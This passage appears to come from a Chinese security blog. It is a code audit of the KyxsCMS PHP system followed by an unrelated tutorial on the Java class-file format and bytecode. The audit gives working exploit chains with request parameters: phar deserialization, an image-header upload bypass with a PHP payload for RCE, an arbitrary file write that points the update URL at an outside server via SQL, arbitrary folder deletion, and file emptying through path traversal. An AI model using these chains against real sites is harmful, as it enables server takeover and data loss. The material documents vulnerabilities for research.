$file-&gt;validate([&#x27;ext&#x27;=&gt;&#x27;txt,html,zip,josn,mp3,wma,wav,amr,mp4&#x27;,&#x27;type&#x27;=&gt;&#x27;text/plain,text/html,application/zip,application/json,audio/mpeg,audio/x-ms-wma,audio/x-wav,audio/amr,video/mp4&#x27;])-&gt;move(config(&#x27;web.upload_path&#x27;).$this-&gt;request-&gt;param(&#x27;path&#x27;).&#x27;/&#x27;.$this-&gt;request-&gt;post(&#x27;uniqueFileName&#x27;),$this-&gt;request-&gt;post(&#x27;chunk&#x27;,0),true,false);                if($info)&#123;                    return json([&#x27;code&#x27;=&gt;1,&#x27;msg&#x27;=&gt;&#x27;上传成功！&#x27;,&#x27;path&#x27;=&gt;substr(config(&#x27;web.upload_path&#x27;),1).$this-&gt;request-&gt;param(&#x27;path&#x27;).&#x27;/&#x27;.$this-&gt;request-&gt;post(&#x27;uniqueFileName&#x27;).&#x27;/&#x27;.str_replace(&#x27;\\\\&#x27;,&#x27;/&#x27;,$info-&gt;getSaveName())]);                &#125; else &#123;                    return json([&#x27;code&#x27;=&gt;0,&#x27;msg&#x27;=&gt;$file-&gt;getError()]);                &#125;            &#125;        &#125;    &#125;\n跟进chunkCheck方法，其中upload_path也是通过数据库中可以读取到，后面的拼接参数均可控，所以target我们是可控的。因此可以利用file_exists()进行phar反序列化\n\n\n测试\n首先修改数据库中的配置项upload_path\nupdate &#123;pre&#125;config set value=&#x27;phar://&#x27; where id=88\n然后拼接参数即可\n# phar://./uploads/config/20221203/3b9697cca522c894290550257f35ed3d.pngstatus=chunkCheck&amp;path=./uploads/config&amp;name=20221203&amp;chunkIndex=3b9697cca522c894290550257f35ed3d.png\n这里记得清楚一下缓存\n\ngetshell\n\n\n\n\nphar 反序列化6 \n还是接着上一个地方，这次根据status值进入chunkMerge方法\nelseif($this-&gt;request-&gt;post(&#x27;status&#x27;) == &#x27;chunksMerge&#x27;)&#123;                if($this-&gt;request-&gt;post(&#x27;name&#x27;))&#123;                    if($file = $this-&gt;chunksMerge($this-&gt;request-&gt;post(&#x27;name&#x27;),$this-&gt;request-&gt;post(&#x27;chunks&#x27;),$this-&gt;request-&gt;post(&#x27;ext&#x27;),$this-&gt;request-&gt;post(&#x27;md5&#x27;)))&#123;                        $file[&#x27;code&#x27;]=1;                        return json($file);                    &#125;\n可以看到传递的参数$this-&gt;request-&gt;post(&#39;name&#39;),$this-&gt;request-&gt;post(&#39;chunks&#39;),$this-&gt;request-&gt;post(&#39;ext&#39;),$this-&gt;request-&gt;post(&#39;md5&#39;)同样均可控\nscandir也可以进行phar反序列化，参数可控(注意设置一下chunks参数，不然&amp;&amp;的惰性会直接不会执行后面的判断语句)\n\nphar://./uploads/config/20221203/3b9697cca522c894290550257f35ed3d.pngstatus=chunksMerge&amp;path=./uploads/config&amp;name=20221203/3b9697cca522c894290550257f35ed3d.png&amp;chunks=1\n\n\n\n文件上传在管理首页发现文件上传功能，定位控制器\n\n定位至app\\admin\\controller\\Upload.php\n\n查看pic()方法\npublic function pic()&#123;        $file = $this-&gt;request-&gt;file(&#x27;file&#x27;);        $info = $file-&gt;validate([&#x27;ext&#x27;=&gt;&#x27;jpg,jpeg,png,gif,webp,bmp&#x27;,&#x27;type&#x27;=&gt;&#x27;image/jpeg,image/png,image/gif,image/webp,image/bmp&#x27;])-&gt;move(config(&#x27;web.upload_path&#x27;).$this-&gt;request-&gt;param(&#x27;path&#x27;));        if($info)&#123;            $this-&gt;success(&#x27;上传成功！&#x27;,&#x27;&#x27;,[&#x27;path&#x27;=&gt;substr(config(&#x27;web.upload_path&#x27;),1).$this-&gt;request-&gt;param(&#x27;path&#x27;).&#x27;/&#x27;.str_replace(&#x27;\\\\&#x27;,&#x27;/&#x27;,$info-&gt;getSaveName())]);        &#125;else&#123;            $this-&gt;error($file-&gt;getError());        &#125;    &#125;\n接收file的上传文件参数，然后经过validate设置后端验证，前面为后缀，后面为MIME类型\n\n然后经过move方法\npublic function move($path, $savename = true, $replace = true, $autoAppendExt = true)    &#123;        // 文件上传失败，捕获错误代码        if (!empty($this-&gt;info[&#x27;error&#x27;])) &#123;            $this-&gt;error($this-&gt;info[&#x27;error&#x27;]);            return false;        &#125;        // 检测合法性        if (!$this-&gt;isValid()) &#123;            $this-&gt;error = &#x27;upload illegal files&#x27;;            return false;        &#125;        // 验证上传        if (!$this-&gt;check()) &#123;            return false;        &#125;        $path = rtrim($path, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR;        // 文件保存命名规则        $saveName = $this-&gt;buildSaveName($savename, $autoAppendExt);        $filename = $path . $saveName;        // 检测目录        if (false === $this-&gt;checkPath(dirname($filename))) &#123;            return false;        &#125;        /* 不覆盖同名文件 */        if (!$replace &amp;&amp; is_file($filename)) &#123;            $this-&gt;error = [&#x27;has the same filename: &#123;:filename&#125;&#x27;, [&#x27;filename&#x27; =&gt; $filename]];            return false;        &#125;        /* 移动文件 */        if ($this-&gt;isTest) &#123;            rename($this-&gt;filename, $filename);        &#125; elseif (!move_uploaded_file($this-&gt;filename, $filename)) &#123;            $this-&gt;error = &#x27;upload write error&#x27;;            return false;        &#125;        // 返回 File对象实例        $file = new self($filename);        $file-&gt;setSaveName($saveName);        $file-&gt;setUploadInfo($this-&gt;info);        return $file;    &#125;\n首先，isValid方法一般正常上传文件就可以通过\n然后看check\npublic function check($rule = [])    &#123;        $rule = $rule ?: $this-&gt;validate;        if ((isset($rule[&#x27;size&#x27;]) &amp;&amp; !$this-&gt;checkSize($rule[&#x27;size&#x27;]))            || (isset($rule[&#x27;type&#x27;]) &amp;&amp; !$this-&gt;checkMime($rule[&#x27;type&#x27;]))            || (isset($rule[&#x27;ext&#x27;]) &amp;&amp; !$this-&gt;checkExt($rule[&#x27;ext&#x27;]))            || !$this-&gt;checkImg()) &#123;            return false;        &#125;        return true;    &#125;\n这个会依次检验文件大小、MIME类型、后缀，然后会检验文件格式\npublic function checkMime($mime)    &#123;        if (is_string($mime)) &#123;            $mime = explode(&#x27;,&#x27;, $mime);        &#125;        if (!in_array(strtolower($this-&gt;getMime()), $mime)) &#123;            $this-&gt;error = &#x27;mimetype to upload is not allowed&#x27;;            return false;        &#125;        return true;    &#125;\n细节看下getMime()\npublic function getMime()    &#123;        $finfo = finfo_open(FILEINFO_MIME_TYPE);        return finfo_file($finfo, $this-&gt;filename);    &#125;\n\nfino_open配合finfo_file将会回文件类型\n\n看一下checkImg方法，还是先检验后缀名，然后调用getImageType进一步获取图片格式\npublic function checkImg()    &#123;        $extension = strtolower(pathinfo($this-&gt;getInfo(&#x27;name&#x27;), PATHINFO_EXTENSION));        /* 对图像文件进行严格检测 */        if (in_array($extension, [&#x27;gif&#x27;, &#x27;jpg&#x27;, &#x27;jpeg&#x27;, &#x27;bmp&#x27;, &#x27;png&#x27;, &#x27;swf&#x27;]) &amp;&amp; !in_array($this-&gt;getImageType($this-&gt;filename), [1, 2, 3, 4, 6, 13])) &#123;            $this-&gt;error = &#x27;illegal image files&#x27;;            return false;        &#125;        return true;    &#125;\n// 判断图像类型protected function getImageType($image)&#123;    if (function_exists(&#x27;exif_imagetype&#x27;)) &#123;        return exif_imagetype($image);    &#125;    try &#123;        $info = getimagesize($image);        return $info ? $info[2] : false;    &#125; catch (\\Exception $e) &#123;        return false;    &#125;&#125;\n这里可以看到实际会调用exif_imagetype()函数，该函数只会检验文件的第一个字节\n\n所以我们可以利用最基本的魔术头或者图片马绕过\nGIF89a&lt;?php phpinfo(); ?&gt;\n\n配合实际测试，即可以看到上传文件的位置及名称\n\n结合上面的文件包含操作我们就可以利用达到RCE的效果\n任意文件写2位于application/admin/controller/Upgrade.php的update()方法\n这里会调用模型层的updates方法，并返回输出json格式数据\n\n先跟入updates()，有个file_put_contents写函数，看看能否利用。先看看参数upArray获取的方法upContent()\npublic function updates()&#123;        $num=Request::get(&#x27;num&#x27;,0);        $upArray=$this-&gt;upContent();        $upCode=Http::doGet(Config::get(&#x27;web.official_url&#x27;).&#x27;/&#x27;.$upArray[$num][&#x27;file_name&#x27;]);        if(!$upCode)&#123;            $this-&gt;error=&quot;读取远程升级文件错误，请检测网络！&quot;;            return false;        &#125;        $dir = dirname($upArray[$num][&#x27;stored_file_name&#x27;]);        if(!is_dir($dir))            mkdir($dir,0755,true);         if(false === @file_put_contents($upArray[$num][&#x27;stored_file_name&#x27;],$upCode))&#123;            $this-&gt;error=&quot;保存文件错误，请检测文件夹写入权限！&quot;;            return false;         &#125;        return $num+1;    &#125;\n这里可以看到会先从缓存中获取update_list字符值，默认情况下肯定是没有的，那么就会从拼接url并发起请求，返回的内容经过json解包即为content值\n\n这里配置项web.official_url项来自数据库，因此可控。发起请求，我们设置为自己的VPS，返回内容可控，因此content可控（注意返回JSON格式的数据）\n​    回到updates函数，@file_put_contents($upArray[$num][&#39;stored_file_name&#39;],$upCode)是我们要利用的语句，其中$upArray[$num][&#39;stored_file_name&#39;]可以构造，也就是文件名可以控制，然后看看upCode是否可控。后者来自$upCode=Http::doGet(Config::get(&#39;web.official_url&#39;).&#39;/&#39;.$upArray[$num][&#39;file_name&#39;]);，和之前同理，改到我们的VPS上去就行。\n\n测试\n首先在数据库中改掉web.official_url配置\n\nadmin/tool/sqlexecute.htmlsql=update &#123;pre&#125;config set value = &quot;http://43.140.198.45:81&quot; where id = 92\n\n第一个url经过拼接就成了http://43.140.198.45:81/upgrade/updata/;第二个为http://43.140.198.45:81/xxx\n之后在VPS上构造一下回显\n\n之后访问\nhttp://localhost/admin/upgrade/update\n很奇怪，我这里虽然数据库改了，获取到的url还是之前的不知道咋回事。。\n解决了，应该是有缓存的缘故，导致读配置直接从缓存读的\n\n\n\n\n任意文件刪除还是刚才的Template.php，其中del方法如下\npublic function del($id)&#123;        $map = [&#x27;id&#x27; =&gt; $id];        $name = Template::where($map)-&gt;column(&#x27;name&#x27;);        foreach ($name as $value) &#123;            del_dir_file(&#x27;./&#x27;.config(&#x27;web.default_tpl&#x27;).DIRECTORY_SEPARATOR.$value,true);        &#125;        $result = Template::where($map)-&gt;delete();        if(false === $result)&#123;            $this-&gt;error=Template::getError();            return false;        &#125;else&#123;            return $result;        &#125;    &#125;\n\n模型会自动对应数据表，模型类的命名规则是除去表前缀的数据表名称，采用驼峰法命名，并且首字母大写\n\n这里首先会从数据库中根据id值，获取ky_template表中name字段的值\n然后拼接传入del_dir_file方法，其代码如下。分析可知，这个path传值需要是一个目录，然后回去遍历该目录下的文件，如果仍存在目录就会递归调用，否则删除文件，当设置为true时，会把当前目录也删掉。由于path可控，所以我们只需要控制好id参数值，即可以删除任意文件夹\nfunction del_dir_file($path, $delDir = FALSE) &#123;    if(is_dir($path))&#123;        $handle = opendir($path);        if ($handle) &#123;            while (false !== ( $item = readdir($handle) )) &#123;                if ($item != &quot;.&quot; &amp;&amp; $item != &quot;..&quot;)                    is_dir(&quot;$path/$item&quot;) ? del_dir_file(&quot;$path/$item&quot;, $delDir) : unlink(&quot;$path/$item&quot;);            &#125;            closedir($handle);            if ($delDir)                return rmdir($path);        &#125;else &#123;            if (file_exists($path)) &#123;                return unlink($path);            &#125; else &#123;                return FALSE;            &#125;        &#125;    &#125;&#125;\n该cms提供了与数据库交互的功能，因此我们可以先插入一条关于文件夹内容的条目\n\n\nsql=insert into &#123;pre&#125;template values(&#x27;2&#x27;, &#x27;../../xx/&#x27;, &#x27;2&#x27;, &#x27;1&#x27;, &#x27;2&#x27;, &#x27;2&#x27;, &#x27;0&#x27;, &#x27;2&#x27;, &#x27;0&#x27;)\n在根目录创建文件夹xx\n\n\n任意文件清空位于`application/admin/controller/Tool.php的sitemap_progress方法`\npublic function sitemap_progress($page=1)&#123;    \t$content=&#x27;&#x27;;    \t$page_num=$this-&gt;request-&gt;param(&#x27;page_num&#x27;);        $page_no=$this-&gt;request-&gt;param(&#x27;page_no&#x27;);        $type=$this-&gt;request-&gt;param(&#x27;type&#x27;); &lt;--        $filename=&#x27;sitemap&#x27;;        $map = [&#x27;status&#x27;=&gt;1];        $novel=Db::name(&#x27;novel&#x27;)-&gt;field(&#x27;id,update_time&#x27;)-&gt;where($map)-&gt;order(&#x27;update_time desc&#x27;)-&gt;limit($page_num);        if($page_no)&#123;        \t$filename.=&#x27;_&#x27;.$page;        \t$data=$novel-&gt;page($page);        \t$count=Db::name(&#x27;novel&#x27;)-&gt;where($map)-&gt;count(&#x27;id&#x27;);        \t$page_count=ceil($count/$page_num);        &#125;else&#123;        \t$page_count=1;        &#125;        $data=$novel-&gt;select(); // 查询不存在返回空数组        foreach ($data as $k=&gt;$v)&#123;\t\t\tif($type==&#x27;xml&#x27;)&#123;\t\t\t\t$content.=&#x27;&lt;url&gt;&#x27;.PHP_EOL.&#x27;&lt;loc&gt;&#x27;.url(&quot;home/novel/index&quot;,[&quot;id&quot;=&gt;$v[&quot;id&quot;]],true,true).&#x27;&lt;/loc&gt;&#x27;.PHP_EOL.&#x27;&lt;mobile:mobile type=&quot;pc,mobile&quot; /&gt;&#x27;.PHP_EOL.&#x27;&lt;priority&gt;0.8&lt;/priority&gt;&#x27;.PHP_EOL.&#x27;&lt;lastmod&gt;&#x27;.time_format($v[&quot;update_time&quot;],&#x27;Y-m-d&#x27;).&#x27;&lt;/lastmod&gt;&#x27;.PHP_EOL.&#x27;&lt;changefreq&gt;daily&lt;/changefreq&gt;&#x27;.PHP_EOL.&#x27;&lt;/url&gt;&#x27;;\t        &#125;else&#123;\t        \t$content.=url(&quot;home/novel/index&quot;,[&quot;id&quot;=&gt;$v[&quot;id&quot;]],true,true).PHP_EOL;\t        &#125;\t\t&#125;        if($type==&#x27;xml&#x27;)&#123;        \t$xml=&#x27;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&#x27;.PHP_EOL.&#x27;&lt;urlset xmlns=&quot;http://www.sitemaps.org/schemas/sitemap/0.9&quot; xmlns:mobile=&quot;http://www.baidu.com/schemas/sitemap-mobile/1/&quot;&gt;&#x27;.PHP_EOL;\t\t\t$xml.=$content.PHP_EOL.&#x27;&lt;/urlset&gt;&#x27;;\t\t\t$content=$xml;        &#125;        $url=$this-&gt;request-&gt;domain().&#x27;/runtime/&#x27;.&#x27;repaste/&#x27;.$filename.&#x27;.&#x27;.$type;        $filename=Env::get(&#x27;runtime_path&#x27;).&#x27;repaste&#x27;.DIRECTORY_SEPARATOR.$filename.&#x27;.&#x27;.$type; &lt;-        $content=File::put($filename,$content); &lt;--        if($page_count&lt;=$page)&#123;            return $this-&gt;success(&#x27;生成完成&#x27;,url(&#x27;sitemap_progress&#x27;,[&#x27;page_no&#x27;=&gt;$page_no,&#x27;page&#x27;=&gt;$page,&#x27;page_num&#x27;=&gt;$page_num,&#x27;type&#x27;=&gt;$type,]),[&#x27;complete&#x27;=&gt;true,&#x27;page_count&#x27;=&gt;$page_count,&#x27;page&#x27;=&gt;$page,&#x27;filename&#x27;=&gt;$url]);        &#125;else&#123;            return $this-&gt;success(&#x27;生成进度&#x27;,url(&#x27;sitemap_progress&#x27;,[&#x27;page_no&#x27;=&gt;$page_no,&#x27;page&#x27;=&gt;$page+1,&#x27;page_num&#x27;=&gt;$page_num,&#x27;type&#x27;=&gt;$type,]),[&#x27;complete&#x27;=&gt;false,&#x27;page_count&#x27;=&gt;$page_count,&#x27;page&#x27;=&gt;$page+1,&#x27;filename&#x27;=&gt;$url]);        &#125;    &#125;\n经过分析可知data的内容只能来自数据库novel表，它经过$data=$novel-&gt;select()，过滤的条件为&#39;status&#39;=&gt;1，因此一种思路是清空文件，也就是不让数据库中留有status=1的数据，这样就会出现content一直都不会被赋值，保持初始值&#39;&#39;。同时对于文件名filename，其组成为Env::get(&#39;runtime_path&#39;).&#39;repaste&#39;.DIRECTORY_SEPARATOR.$filename.&#39;.&#39;.$type，虽然前面不可控，但是type可控可以利用目录穿越。这时候只需要一个文件写函数即可，关注File::put()\n\n测试时根目录创建一个test.php\n\n然后利用上述漏洞\nEnv::get(&#x27;runtime_path&#x27;).&#x27;repaste&#x27;.DIRECTORY_SEPARATOR.$filename.&#x27;.&#x27;.$type?type=/../../../test.php\n\n参考链接https://y4tacker.blog.csdn.net/article/details/115716192\nhttps://forum.butian.net/share/1238\nhttps://www.kancloud.cn/wt4027593/kyxscms\nhttps://ego00.blog.csdn.net/article/details/117630617\n","tags":["代码审计"]},{"title":"ASM字节码学习","url":"/2023/01/18/Java%20%E5%AD%97%E8%8A%82%E7%A0%81/","content":"Java 字节码Java class文件格式ClassFile &#123;    u4 magic;    u2 minor_version;    u2 major_version;    u2 constant_pool_count;    cp_info constant_pool[constant_pool_count-1];    u2 access_flags;    u2 this_class;    u2 super_class;    u2 interfaces_count;    u2 interfaces[interfaces_count];    u2 fields_count;    field_info fields[fields_count];    u2 methods_count;    method_info methods[methods_count];    u2 attributes_count;    attribute_info attributes[attributes_count];&#125;\n\nu1 、u2、 u4 分别表示1、2、4个字节的无符号数。x即代表字节无符号数、其余info类型是复合结构\n可使用java.io.DataInputStream类中的对应方法：readUnsignedByte、readUnsignedShort、readInt方法读取。\n\n魔数 Magic \n固定值 0xCAFEBABE\n\n\nJVM加载class文件时会先读取4字节（u4 magic;）的魔数信息校验是否是一个class文件\n\n\n\n版本号 Minor/Major Version\nclass文件的版本号由两个u2组成（u2 minor_version; u2 major_version;），分别表示的是minor_version（副版本号）、major_version （主版本号），我们常说的JDK1.8、Java9等说的就是主版本号。\n\n| JDK版本 | 十进制 | 十六进制 | 发布时间 || ———- | ————— | —————— | ———— || JDK1.1  | 45         | 2D           | 1996-05  || JDK1.2  | 46         | 2E           | 1998-12  || JDK1.3  | 47         | 2F           | 2000-05  || JDK1.4  | 48         | 30           | 2002-02  || JDK1.5  | 49         | 31           | 2004-09  || JDK1.6  | 50         | 32           | 2006-12  || JDK1.7  | 51         | 33           | 2011-07  || JDK1.8  | 52         | 34           | 2014-03  || Java9   | 53         | 35           | 2017-09  || Java10  | 54         | 36           | 2018-03  || Java11  | 55         | 37           | 2018-09  || Java12  | 56         | 38           | 2019-03  || Java13  | 57         | 39           | 2019-09  || Java14  | 58         | 3A           | 2020-03  || Java15  | 59         | 3B           | 2020-09  |\n\nconstant_pool_count 常量池计数器\n表示常量池中的数量，数值上等于 常量池的数量+1\n需要特别注意的是long和double类型的常量池对象占用两个常量位\n\nconstant_pool 常量池\n表结构 cp_info constant_pool[constant_pool_count-1];\n常量池对象 cp_info 数据结构：\ncp_info &#123;   u1 tag;   u1 info[];&#125;\nu1 tag;表示的是常量池中的存储类型，每一种tag都对应了不同的数据结构。\n\naccess_flags 访问标志\n表示的是某个类或者接口的访问权限及属性。\n\n| 标志名         | 十六进制值 | 描述                                                   || ——————— | ————— | ——————————————————————————— || ACC_PUBLIC     | 0x0001     | 声明为public                                           || ACC_FINAL      | 0x0010     | 声明为final                                            || ACC_SUPER      | 0x0020     | 废弃/仅JDK1.0.2前使用                                  || ACC_INTERFACE  | 0x0200     | 声明为接口                                             || ACC_ABSTRACT   | 0x0400     | 声明为abstract                                         || ACC_SYNTHETIC  | 0x1000     | 声明为synthetic，表示该class文件并非由Java源代码所生成 || ACC_ANNOTATION | 0x2000     | 标识注解类型                                           || ACC_ENUM       | 0x4000     | 标识枚举类型                                           |\n\n\nthis_class 当前类名称\n当前class文件的类名所在常量池中的索引位置\n\nsuper_class 当前类的父类\n当前class文件的父类类名所在常量池中的索引位置。\njava/lang/Object类的super_class的为0，其他任何类的super_class都必须是一个常量池中存在的索引位置。\n\ninterfaces_count 当前类继承或实现的接口数\n表示的是当前类继承或实现的接口数\n\ninterfaces[] 接口名称数组\n表示所有接口数组\n\nfields_count 当前类的成员变量数\n当前class中的成员变量个数\n\nfields[] 成员变量数组\nfield_info 成员变量的数据结构：\nfield_info &#123;   u2 access_flags;   u2 name_index;   u2 descriptor_index;   u2 attributes_count;   attribute_info attributes[attributes_count];&#125;\n\naccess_flags 表示的是成员变量的修饰符\n| Flag Name       | Value  | Interpretation                                               || ———————- | ——— | —————————————————————————————— || ACC_PUBLIC    | 0x0001 | Declared public; may be accessed from outside its package. || ACC_PRIVATE   | 0x0002 | Declared private; accessible only within the defining class and other classes belonging to the same nest (§5.4.4). || ACC_PROTECTED | 0x0004 | Declared protected; may be accessed within subclasses.     || ACC_STATIC    | 0x0008 | Declared static.                                           || ACC_FINAL     | 0x0010 | Declared final; never directly assigned to after object construction (JLS §17.5). || ACC_VOLATILE  | 0x0040 | Declared volatile; cannot be cached.                       || ACC_TRANSIENT | 0x0080 | Declared transient; not written or read by a persistent object manager. || ACC_SYNTHETIC | 0x1000 | Declared synthetic; not present in the source code.          || ACC_ENUM      | 0x4000 | Declared as an element of an enum.                         |\n\nname_index 表示的是成员变量的名称\n\ndescriptor_index 表示的是成员变量的描述符\n\nattributes_count 表示的是成员变量的属性数量\n\nattribute_info attributes[attributes_count] 表示的成员变量的属性信息\n\n\n\nmethods_count 当前类的成员方法数\n表示的是当前class中的成员方法个数\n\nmethods 成员方法数组\nmethod_info 成员方法对象数据结构\nmethod_info &#123;   u2 access_flags;   u2 name_index;   u2 descriptor_index;   u2 attributes_count;   attribute_info attributes[attributes_count];&#125;\n\naccess_flags 成员方法的修饰符\n| Flag Name          | Value  | Interpretation                                               || ————————— | ——— | —————————————————————————————— || ACC_PUBLIC       | 0x0001 | Declared public; may be accessed from outside its package. || ACC_PRIVATE      | 0x0002 | Declared private; accessible only within the defining class and other classes belonging to the same nest (§5.4.4). || ACC_PROTECTED    | 0x0004 | Declared protected; may be accessed within subclasses.     || ACC_STATIC       | 0x0008 | Declared static.                                           || ACC_FINAL        | 0x0010 | Declared final; must not be overridden (§5.4.5). || ACC_SYNCHRONIZED | 0x0020 | Declared synchronized; invocation is wrapped by a monitor use. || ACC_BRIDGE       | 0x0040 | A bridge method, generated by the compiler.                  || ACC_VARARGS      | 0x0080 | Declared with variable number of arguments.                  || ACC_NATIVE       | 0x0100 | Declared native; implemented in a language other than the Java programming language. || ACC_ABSTRACT     | 0x0400 | Declared abstract; no implementation is provided.          || ACC_STRICT       | 0x0800 | Declared strictfp; floating-point mode is FP-strict.       || ACC_SYNTHETIC    | 0x1000 | Declared synthetic; not present in the source code.          |\n\nname_index 成员方法的名称\n\ndescriptor_index 成员方法的描述符\n\nattributes_count 成员方法的属性数量\n\nattributes 成员方法的属性信息\n\n\n\nattributes_count 当前类的属性数\n当前class文件属性表的成员个数\n\nattributes[] 属性数组\nattribute_info 属性信息数据结构\nattribute_info &#123;   u2 attribute_name_index;   u4 attribute_length;   u1 info[attribute_length];&#125;\n\nattribute_name_index 属性名称索引\n读取attribute_name_index值所在常量池中的名称可以得到属性名称\n\n\n\n属性对象\n属性表是动态的，新的JDK版本可能会添加新的属性值。每一种属性的数据结构都不相同，所以读取到属性名称后还需要根据属性的类型解析不同属性表中的值。比如Code Attribute中存储了类方法的异常表、字节码指令集、属性信息等重要信息。\n\n\n\nJava Class 文件解析\n解析流程\n首先是魔术头和版本，调用 DataInputStream()正常获取即可\n然后是常量池的解析：\n\n\n读取常量池数量（u2 constant_pool_count;）；\n读取tag；\n根据不同的tag类型解析常量池对象；\n解析常量池中的对象；\n链接常量池中的索引引用；\n\n\n\n\n/** * 解析常量池数据 * * @throws IOException 数据读取异常 */private void parseConstantPool() throws IOException &#123;    // u2 constant_pool_count;    this.poolCount = dis.readUnsignedShort();    // cp_info constant_pool[constant_pool_count-1];    for (int i = 1; i &lt;= poolCount - 1; i++) &#123;        //            cp_info &#123;        //                u1 tag;        //                u1 info[];        //            &#125;        int      tag      = dis.readUnsignedByte();        Constant constant = Constant.getConstant(tag);        if (constant == null) &#123;              throw new RuntimeException(&quot;解析常量池异常，无法识别的常量池类型：&quot; + tag);        &#125;        // 解析常量池对象        parseConstantItems(constant, i);        // Long和Double是宽类型，占两位        if (CONSTANT_LONG == constant || CONSTANT_DOUBLE == constant) &#123;              i++;        &#125;    &#125;    // 链接常量池中的引用    linkConstantPool();&#125;\n有很多对象的数据结构中又引用了其他对象，为了能够直观的看到常量池ID为1的对象信息我们就必须要将所有使用索引方式链接的映射关系改成直接字符串引用\n/** * 链接常量池中的引用 */private void linkConstantPool() &#123;    for (Integer id : constantPoolMap.keySet()) &#123;        Map&lt;String, Object&gt; valueMap = constantPoolMap.get(id);        if (!valueMap.containsKey(&quot;value&quot;)) &#123;            Map&lt;String, Object&gt; newMap = new LinkedHashMap&lt;&gt;();            for (String key : valueMap.keySet()) &#123;                if (key.endsWith(&quot;Index&quot;)) &#123;                      Object value = recursionValue((Integer) valueMap.get(key));                    if (value != null) &#123;                        String newKey = key.substring(0, key.indexOf(&quot;Index&quot;));                        newMap.put(newKey + &quot;Value&quot;, value);                    &#125;                &#125;            &#125;            valueMap.putAll(newMap);        &#125;    &#125;&#125;/** * 递归查找ID对应的常量池中的值 * * @param id 常量池ID * @return 常量池中存储的值 */private Object recursionValue(Integer id) &#123;    Map&lt;String, Object&gt; map = constantPoolMap.get(id);    if (map.containsKey(&quot;value&quot;)) &#123;        return map.get(&quot;value&quot;);    &#125;    for (String key : map.keySet()) &#123;        if (key.endsWith(&quot;Index&quot;)) &#123;            Integer value = (Integer) map.get(key);            return recursionValue(value);        &#125;    &#125;    return null;&#125;\n访问标志解析：\nu2 access_flags\n直接 readUnsignedShort()\n当前类名称解析：\ndis.readUnsignedShort()获取到类名所在的常量池中的索引位置，然后根据常量池ID读取常量池中的字符串内容即可解析出类名\n当前类的父类名称解析：\n当解析java.lang.Object时super_class的值为0，常量池中不包含索引为0的对象，所以需要直接将父类名称设置为java/lang/Object\n接口解析：\n和上面一样，先获取接口数量，然后遍历获取所有接口名称的索引值\n// u2 interfaces_count;this.interfacesCount = dis.readUnsignedShort();// 创建接口Index数组this.interfaces = new String[interfacesCount];// u2 interfaces[interfaces_count];for (int i = 0; i &lt; interfacesCount; i++) &#123;    int index = dis.readUnsignedShort();    // 设置接口名称    this.interfaces[i] = (String) getConstantPoolValue(index);&#125;\n成员变量/成员方法解析：\n两者数据结构一致，所以按照相同的处理逻辑。先解析出变量/方法的总数，然后遍历解析对象的数据结构中的所有信息\n这里还有一个 attribute_info attribute[attributes_count] 需要解析\nJava class 文件属性解析\n属性信息表数据结构：\nu2 attributes_count;attribute_info attributes[attributes_count];attribute_info &#123;   u2 attribute_name_index;   u4 attribute_length;   u1 info[attribute_length];&#125;\n解析前面几个的流程类似，先解析属性表长度，然后遍历对attribute_info进行解析，前面 attribute_name_index 和 attribute_length 为固定长度值，直接 DataInstream 调用即可\n接下来解析出属性名称后（在常量池中查找）按照 JVM虚拟机规范-属性https://docs.oracle.com/javase/specs/jvms/se15/html/jvms-4.html#jvms-4.7 来解析\n对于 ConstantValue： \n用于表示field_info中的静态变量的初始值\n数据结构如下: 只需要读取解析最后一个字段即可\nConstantValue_attribute &#123;    u2 attribute_name_index;    u4 attribute_length;    u2 constantvalue_index;&#125;\n对于 Code：\nCode属性用于表示成员方法的代码部分，Code中包含了指令集（byte数组），JVM调用成员方法时实际上就是执行的Code中的指令，而反编译工具则是把Code中的指令翻译成了Java代码\nCode_attribute &#123;    u2 attribute_name_index;    u4 attribute_length;    u2 max_stack;    u2 max_locals;    u4 code_length;    u1 code[code_length];    u2 exception_table_length;    &#123;   u2 start_pc;        u2 end_pc;        u2 handler_pc;        u2 catch_type;    &#125; exception_table[exception_table_length];    u2 attributes_count;    attribute_info attributes[attributes_count];&#125;\n在解析Code属性时code_length表示的是Code的字节长度，max_stack和max_locals是一个固定值，表示的是最大操作数栈和最大局部变量数，这两个值是在编译类方法时自动计算出来的，如果通过ASM修改了类方法可能会需要重新计算max_stack和max_locals。\n解析Code的指令集时需要对照指令集映射表，然后根据不同的指令实现不一样的指令处理逻辑 https://docs.oracle.com/javase/specs/jvms/se15/html/jvms-6.html#jvms-6.5\n可视化：\njavap -verbose xxx.class\nJava虚拟机指令集\nJvm\n首先要了解栈帧的概念\n\n栈帧是用来存储数据和部分过程结果的数据结构，同时也用来处理动态连接、方法返回值和异常分派。 栈帧随着方法调用而创建，随着方法结束而销毁——无论方法正常完成还是异常完成都算作方法结束。 栈帧的存储空间由创建它的线程分配在Java虚拟机栈之中，每一个栈帧都有自己的本地变量表(局部变量表)、操作数栈和指向当前方法所属的类的运行时常量池的引用。\n\n\n\n局部变量表\nLocal Variable Table 是一组变量值存储空间，用于存放方法参数和方法内定义的局部变量。单位规范以变量槽（Slot）为最小单位，一个槽应该可以存放一个32位以内的数据类型。\n虚拟机通过索引定位的方法查找相应的局部变量，索引的范围是从0~局部变量表最大容量。如果Slot是32位的，则遇到一个64位数据类型的变量(如long或double型)，则会连续使用两个连续的Slot来存储。\n\n操作数栈\nOperand Stack LIFO数据结构，其最大深度在编译时写入到方法的Code属性的max_stacks数据项中\n操作数栈的每一个元素可以是任意Java数据类型，32位的数据类型占一个栈容量，64位的数据类型占2个栈容量,且在方法执行的任意时刻，操作数栈的深度都不会超过max_stacks中设置的最大值。\n\n动态链接\n在class文件中，方法调用需要将目标方法的符号引用转换为其在内存地址中的直接引用，符号引用存在于方法区中的运行时常量池。\nJava虚拟机栈中，每个栈帧都包含一个指向运行时常量池中该栈所属方法的符号引用，持有这个引用的目的是为了支持方法调用过程中的动态连接(Dynamic Linking)。\n\n方法返回\n分为正常完成和异常完成两种\n\n\n\n类型/方法描述符\n| 描述符   | Java类型           | 示例                     || ———— | ————————— | ———————————— || B      | byte             | B                      || C      | char             | C                      || D      | double           | D                      || F      | float            | F                      || I      | int              | I                      || J      | long             | J                      || S      | short            | S                      || Z      | boolean          | Z                      || [      | 数组             | [IJ                    || L类名; | 引用类型对象** | Ljava/lang/Object;** |\n方法描述符实例：\n| 方法示例                            | 描述符                                   | 描述                          || —————————————————- | ———————————————————— | ——————————————- || 